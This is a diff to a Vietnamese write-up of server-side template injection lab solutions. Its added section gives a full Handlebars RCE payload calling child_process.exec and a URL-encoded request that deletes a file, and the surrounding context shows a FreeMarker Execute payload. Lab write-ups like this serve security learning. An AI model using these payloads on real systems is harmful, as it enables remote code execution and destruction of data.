@@ -15,6 +15,41 @@ Thử chèn `${abc}` thì xuất hiện thông báo lỗi cho ta biết website 
 Sau khi research trên internet, ta tìm được một số payload. Thử chèn `${"freemarker.template.utility.Execute"?new()("id")}` thì kết quả của lệnh id được trả về trong response. Như vậy, để xóa file "morale.txt", ta chèn vào payload `${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}`. Sau khi click Review, bài lab được giải thành công.
 
 # 4. Server-side template injection in an unknown language with a documented exploit
+Ta thấy với URL `/?message=abc` thì đoạn text "abc" sẽ được hiển thị trong response. Thử với `{{7*7}}` thì xuất hiện lỗi như sau:
+
+![image](https://user-images.githubusercontent.com/103978452/219276586-6560f565-ba8f-4c84-a7d5-6e4cd0900619.png)
+
+Như vậy ta biết được website sử dụng NodeJs, và sau một số research thì xác định thêm template được sử dụng là "handlebars". Ta tìm được một payload RCE trên Hacktricks như sau:
+
+```
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('whoami');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+Thay thế command "whoami" thành "rm /home/carlos/morale.txt", thực hiện URL encoded rồi gán vào tham số "message". Như vậy request như sau:
+
+```
+GET /?message=%7b%7b%23with%20"s"%20as%20%7cstring%7c%7d%7d%0d%0a%20%20%7b%7b%23with%20"e"%7d%7d%0d%0a%20%20%20%20%7b%7b%23with%20split%20as%20%7cconslist%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7bthis%2epop%7d%7d%0d%0a%20%20%20%20%20%20%7b%7bthis%2epush%20%28lookup%20string%2esub%20"constructor"%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7bthis%2epop%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23with%20string%2esplit%20as%20%7ccodelist%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7bthis%2epop%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7bthis%2epush%20"return%20require%28%27child_process%27%29%2eexec%28%27rm%20%2fhome%2fcarlos%2fmorale%2etxt%27%29%3b"%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7bthis%2epop%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23each%20conslist%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23with%20%28string%2esub%2eapply%200%20codelist%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7bthis%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2fwith%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2feach%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2fwith%7d%7d%0d%0a%20%20%20%20%7b%7b%2fwith%7d%7d%0d%0a%20%20%7b%7b%2fwith%7d%7d%0d%0a%7b%7b%2fwith%7d%7d
+```
+
+Sau khi submit, kết quả thành công.
 
 # 5. Server-side template injection with information disclosure via user-supplied objects
 
